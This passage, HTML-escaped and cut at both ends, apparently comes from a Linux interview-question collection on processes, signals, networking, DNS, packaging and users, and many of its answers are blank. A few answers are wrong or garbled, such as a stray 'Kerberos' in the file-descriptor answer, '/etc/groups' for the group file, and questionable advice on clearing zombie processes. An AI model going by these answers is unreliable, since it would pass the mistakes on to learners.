again in current session. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How can you find how much memory a specific process consumes?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;code&gt; mem() { ps -eo rss,pid,euser,args:100 --sort %mem | grep -v grep | grep -i $@ | awk &#39;{printf $1/1024 &#34;MB&#34;; $1=&#34;&#34;; print }&#39; } &lt;/code&gt; [Source](https://stackoverflow.com/questions/3853655/in-linux-how-to-tell-how-much-memory-processes-are-using) &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What signal is used by default when you run &#39;kill *process id*&#39;?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&#xA;The default signal is SIGTERM (15). This signal kills&#xA;process gracefully which means it allows it to save current&#xA;state configuration.&#xA;&lt;/pre&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What signals are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;SIGTERM - default signal for terminating a process SIGHUP - common usage is for reloading configuration SIGKILL - a signal which cannot caught or ignored&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;To view all available signals run &lt;code&gt;kill -l&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What &lt;code&gt;kill 0&lt;/code&gt; does?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What &lt;code&gt;kill -0 &#xA;   &lt;pid&gt;&lt;/pid&gt;&lt;/code&gt; does?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a trap?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Every couple of days, a certain process stops running. How can you look into why it&#39;s happening?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What happens when you press ctrl + c?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a Daemon in Linux?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;A background process. Most of these processes are waiting for requests or set of conditions to be met before actually running anything. Some examples: sshd, crond, rpcbind. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are the possible states of a process in Linux?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&#xA;Running (R)&#xA;Uninterruptible Sleep (D) - The process is waiting for I/O&#xA;Interruptible Sleep (S)&#xA;Stopped (T)&#xA;Dead (x)&#xA;Zombie (z)&#xA;&lt;/pre&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you kill a process in D state?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a zombie process?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;A process which has finished to run but has not exited.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;One reason it happens is when a parent process is programmed incorrectly. Every parent process should execute wait() to get the exit code from the child process which finished to run. But when the parent isn&#39;t checking for the child exit code, the child process can still exists although it finished to run. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to get rid of zombie processes?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;You can&#39;t kill a zombie process the regular way with &lt;code&gt;kill -9&lt;/code&gt; for example as it&#39;s already dead.&lt;/p&gt; &lt;p&gt;One way to kill zombie process is by sending SIGCHLD to the parent process telling it to terminate its child processes. This might not work if the parent process wasn&#39;t programmed properly. The invocation is &lt;code&gt;kill -s SIGCHLD [parent_pid]&lt;/code&gt;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;You can also try closing/terminating the parent process. This will make the zombie process a child of init (1) which does periodic cleanups and will at some point clean up the zombie process. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to find all the &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Processes executed/owned by a certain user&lt;/li&gt; &#xA;   &lt;li&gt;Process which are Java processes&lt;/li&gt; &#xA;   &lt;li&gt;Zombie Processes&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;If you mention at any point ps command with arugments, be familiar with what these arguments does exactly. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the init process?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; It is the first process executed by the kernel during the booting of a system. It is a daemon process which runs till the system is shutdown. That is why, it is the parent of all the processes &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you describe how processes are being created?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to change the priority of a process? Why would you want to do that?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you explain how network process/connection is established and how it&#39;s terminated?&amp;gt;&lt;/summary&gt;&#xA; &lt;br&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What &lt;code&gt;strace&lt;/code&gt; does? What about &lt;code&gt;ltrace&lt;/code&gt;?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Find all the files which end with &#39;.yml&#39; and replace the number 1 in 2 in each file&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;find /some_dir -iname *.yml -print0 | xargs -0 -r sed -i &#34;s/1/2/g&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You run ls and you get &#34;/lib/ld-linux-armhf.so.3 no such file or directory&#34;. What is the problem?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The ls executable is built for an incompatible architecture. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How would you split a 50 lines file into 2 files of 25 lines each?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;You can use the &lt;code&gt;split&lt;/code&gt; command this way: &lt;code&gt;split -l 25 some_file&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a file descriptor? What file descriptors are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; Kerberos File descriptor, also known as file handler, is a unique number which identifies an open file in the operating system. &lt;p&gt;In Linux (and Unix) the first three file descriptors are:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;0 - the default data stream for input&lt;/li&gt; &#xA;   &lt;li&gt;1 - the default data stream for output&lt;/li&gt; &#xA;   &lt;li&gt;2 - the default data stream for output related to errors&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;This is a great article on the topic: &lt;a href=&#34;https://www.computerhope.com/jargon/f/file-descriptor.htm&#34;&gt;https://www.computerhope.com/jargon/f/file-descriptor.htm&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is NTP? What is it used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Kernel OOM&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h5&gt;Linux Security&lt;/h5&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is chroot? In what scenarios would you consider using it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is SELiunx?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Kerberos?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is nftables?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What firewalld daemon is responsible for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Do you have experience with hardening servers? Can you describe the process?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h5&gt;Linux - Networking&lt;/h5&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to list all the interfaces?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;ip link show&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the loopback (lo) interface?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The loopback interface is a special, virtual network interface that your computer uses to communicate with itself. It is used mainly for diagnostics and troubleshooting, and to connect to servers running on the local machine. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What the following commands are used for? &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;ip addr&lt;/li&gt; &#xA;   &lt;li&gt;ip route&lt;/li&gt; &#xA;   &lt;li&gt;ip link&lt;/li&gt; &#xA;   &lt;li&gt;ping&lt;/li&gt; &#xA;   &lt;li&gt;netstat&lt;/li&gt; &#xA;   &lt;li&gt;traceroute&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a network namespace? What is it used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to check if a certain port is being used?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;One of the following would work:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;netstat -tnlp | grep &amp;lt;port_number&amp;gt;&#xA;lsof -i -n -P | grep &amp;lt;port_number&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How can you turn your Linux server into a router?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a virtual IP? In what situation would you use it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? The MAC address of an interface is assigned/set by the OS&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;False &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you have more than one default gateway in a given system?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Technically, yes. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is telnet and why is it a bad idea to use it in production? (or at all)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Telnet is a type of client-server protocol that can be used to open a command line on a remote computer, typically a server. By default, all the data sent and received via telnet is transmitted in clear/plain text, therefore it should not be used as it does not encrypt any data between the client and the server. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the routing table? How do you view it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How can you send an HTTP request from your shell?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;br&gt; Using nc is one way&lt;br&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are packet sniffers? Have you used one in the past? If yes, which packet sniffers have you used and for what purpose?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; It is a network utility that analyses and may inject tasks into the data-stream travelling over the targeted network. &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to list active connections?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to trigger neighbor discovery in IPv6?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;One way would be &lt;code&gt;ping6 ff02::1&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is network interface bonding and do you know how it&#39;s performed in Linux?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What network bonding modes are there?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;There a couple of modes:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;balance-rr: round robing bonding&lt;/li&gt; &lt;li&gt;active-backup: a fault tolerance mode where only one is active&lt;/li&gt; &lt;li&gt;balance-tlb: Adaptive transmit load balancing&lt;/li&gt; &lt;li&gt;balance-alb: Adaptive load balancing &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a bridge? How it&#39;s added in Linux OS?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h5&gt;Linux - DNS&lt;/h5&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to check what is the hostname of the system?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;&lt;code&gt;cat /etc/hostname&lt;/code&gt;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;You can also run &lt;code&gt;hostnamectl&lt;/code&gt; or &lt;code&gt;hostname&lt;/code&gt; but that might print only a temporary hostname. The one in the file is the permanent one. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What the file &lt;code&gt;/etc/resolv.conf&lt;/code&gt; is used for? What does it include?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What commands are you using for performing DNS queries (or troubleshoot DNS related issues)?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;You can specify one or more of the following:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;&lt;code&gt;dig&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;code&gt;host&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;code&gt;nslookup&lt;/code&gt; &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You run &lt;code&gt;dig codingshell.com&lt;/code&gt; and get the following result: &lt;pre&gt;&lt;code&gt;ANSWER SECTION:&#xA;codingshell.com.&#x9;3515&#x9;IN&#x9;A&#x9;185.199.109.153&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;What is the meaning of the number 3515?&lt;/p&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;This is the TTL. When you lookup for an address using a domain/host name, your OS is performing DNS resolution by contacting DNS name servers to get the IP address of the host/domain you are looking for.&lt;br&gt; When you get a reply, this reply in cached in your OS for a certain period of time. This is period of time is also known as TTL and this is the meaning of 3515 number - it will be cached for 3515 seconds before removed from the cache and during that period of time, you&#39;ll get the value from the cache instead of asking DNS name servers for the address again. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h5&gt;Linux - Packaging&lt;/h5&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Do you have experience with packaging? (as in building packages) Can you explain how does it works?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How packages installation/removal is performed on the distribution you are using?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;The answer depends on the distribution being used.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;In Fedora/CentOS/RHEL/Rocky it can be done with &lt;code&gt;rpm&lt;/code&gt; or &lt;code&gt;dnf&lt;/code&gt; commands. In Ubuntu it can be done with the &lt;code&gt;apt&lt;/code&gt; command. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;RPM: explain the spec format (what it should and can include)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you list the content of a package without actually installing it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to know to which package a file on the system belongs to? Is it a problem if it doesn&#39;t belongs to any package?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Where repositories are stored? (based on the distribution you are using)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is an archive? How do you create one in Linux?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to extract the content of an archive?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Why do we need package managers? Why not simply creating archives and publish them?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Package managers allow you to manage packages lifecycle as in installing, removing and updating the packages.&lt;br&gt; In addition, you can specify in a spec how a certain package will be installed - where to copy the files, which commands to run prior to the installation, post the installation, etc. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Linux DNF&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is DNF?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;From the &lt;a href=&#34;https://github.com/rpm-software-management/dnf&#34;&gt;repo&lt;/a&gt;:&lt;/p&gt; &lt;p&gt;&#34;Dandified YUM (DNF) is the next upcoming major version of YUM. It does package management using RPM, libsolv and hawkey libraries.&#34;&lt;/p&gt; &lt;p&gt;Official &lt;a href=&#34;https://dnf.readthedocs.io/en/latest/&#34;&gt;docs&lt;/a&gt;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to look for a package that provides the command /usr/bin/git? (the package isn&#39;t necessarily installed)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;dnf provides /usr/bin/git &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h5&gt;Linux Applications and Services&lt;/h5&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What can you find in /etc/services?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to make sure a Service starts automatically after a reboot or crash?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Depends on the init system.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Systemd: &lt;code&gt; systemctl enable [service_name] &lt;/code&gt; System V: &lt;code&gt; update-rc.d [service_name] &lt;/code&gt; and add this line &lt;code&gt; id:5678:respawn:/bin/sh /path/to/app &lt;/code&gt; to /etc/inittab Upstart: add Upstart init script at /etc/init/service.conf &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You run &lt;code&gt;ssh 127.0.0.1&lt;/code&gt; but it fails with &#34;connection refused&#34;. What could be the problem?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ol&gt;&#xA;  &lt;b&gt; &lt;li&gt;SSH server is not installed&lt;/li&gt; &lt;li&gt;SSH server is not running &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ol&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to print the shared libraries required by a certain program? What is it useful for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is CUPS?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What types of web servers are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Nginx, Apache httpd. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h5&gt;Linux Users and Groups&lt;/h5&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a &#34;superuser&#34; (or root user)? How is it different from regular users?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you create users? Where user information is stored?&lt;/summary&gt;&#xA; &lt;br&gt; &#xA; &lt;p&gt;Command to create users is &lt;code&gt;useradd&lt;/code&gt;&lt;/p&gt; &#xA; &lt;p&gt;Syntax: &lt;code&gt;useradd [options] Username&lt;/code&gt;&lt;/p&gt; &#xA; &lt;p&gt;There are 2 configuration files, which stores users information&lt;/p&gt; &#xA; &lt;ol&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;code&gt;/etc/passwd&lt;/code&gt; - Users information like, username, shell etc is stored in this file&lt;/p&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;code&gt;/etc/shadow&lt;/code&gt; - Users password is stored in encrypted format&lt;/p&gt; &lt;/li&gt; &#xA; &lt;/ol&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Which file stores information about groups?&lt;/summary&gt;&#xA; &lt;br&gt; &#xA; &lt;p&gt;&lt;code&gt;/etc/groups&lt;/code&gt; file stores the group name, group ID, usernames which are in secondary group.&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you change/set the password of a user?&lt;/summary&gt;&#xA; &lt;br&gt; &#xA; &lt;p&gt;&lt;code&gt;passwd &amp;lt;username&amp;gt;&lt;/code&gt; is the command to set/change password of a user.&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Which file stores users passwords? Is it visible for everyone?&lt;/summary&gt;&#xA; &lt;br&gt; &#xA; &lt;p&gt;&lt;code&gt;/etc/shadow&lt;/code&gt; file holds the passwords of the users in encryted format. NO, it is only visble to the &lt;code&gt;root&lt;/code&gt; user&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Do you know how to create a new user without using adduser/useradd command?&lt;/summary&gt;&#xA; &lt;br&gt; &#xA; &lt;p&gt;YES, we can create new user by manually adding an entry in the &lt;code&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt; &#xA; &lt;p&gt;For example, if we need to create a user called &lt;code&gt;john&lt;/code&gt;.&lt;/p&gt; &#xA; &lt;p&gt;Step 1: Add an entry to &lt;code&gt;/etc/passwd&lt;/code&gt; file, so user gets created.&lt;/p&gt; &#xA; &lt;p&gt;&lt;code&gt;echo &#34;john&lt;span&gt;❌&lt;/span&gt;2001:2001::/home/john:/bin/bash&#34; &amp;gt;&amp;gt; /etc/passwd&lt;/code&gt;&lt;/p&gt; &#xA; &lt;p&gt;Step 2: Add an entry to 